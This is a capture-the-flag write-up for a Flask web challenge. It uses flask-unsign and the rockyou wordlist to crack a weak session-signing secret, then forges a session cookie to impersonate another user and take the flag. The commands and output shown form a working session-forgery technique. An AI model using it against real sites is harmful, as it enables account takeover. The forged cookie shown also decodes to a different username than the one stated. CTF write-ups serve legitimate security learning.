# CyberStreak v1.0

> Hello, 
>
> I am a student and I would like to improve my web development skills. To practice, I am creating my first web application. This application is a kind of cybercoach. Example: you want to do sports. A sport goal could be to do 100 push-ups per day for 1 month. The application will allow you to create this "challenge" and each day, you will have to do the number of push-ups you have set and note it in the application. If you don't do the push-ups for 3 days, it's a failure and you lose your streak. 
> 
> This first version of the application gives you the possibility to create an account and to do the challenge of the example. 
> 
> Can you test the security of my application ?
> 
> **xXx-michel-xXx**
> 
> http://challs.dvc.tf:5001
> 
> *Brute force is strictly forbidden and useless.*
> 

- Response headers : `Server : Werkzeug/2.0.3 Python/3.9.7` -> Flask used
- https://book.hacktricks.xyz/pentesting/pentesting-web/flask#flask-unsign
- Create an account and login to get a session token : `eyJ1c2VybmFtZSI6ImFhIn0.YiTXwg.rQQZCm707NBMMYiCYq-Q98wgCGI`
- Crack the secret key used to sign the session token :

```
$ flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImFhIn0.YiTXwg.rQQZCm707NBMMYiCYq-Q98wgCGI' --wordlist rockyou.txt --no-literal-eval
[*] Session decodes to: {'username': 'aa'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 70144 attempts
b's3cr3t'
```

- Sign `{'username': 'xXx-michel-xXx'}` with the secret key `s3cr3t` : 

```
$ flask-unsign --sign --cookie "{'username': 'xXx-michel-xXx'}" --secret 's3cr3t'
eyJ1c2VybmFtZSI6IkFkYW1hbnR5ciJ9.YiTbWA.oedcmipeyxCBt6MWFKdMh7VeyIk
```

- Go to http://challs.dvc.tf:5001 with the cookie : `session=eyJ1c2VybmFtZSI6IkFkYW1hbnR5ciJ9.YiTbWA.oedcmipeyxCBt6MWFKdMh7VeyIk` and get the flag
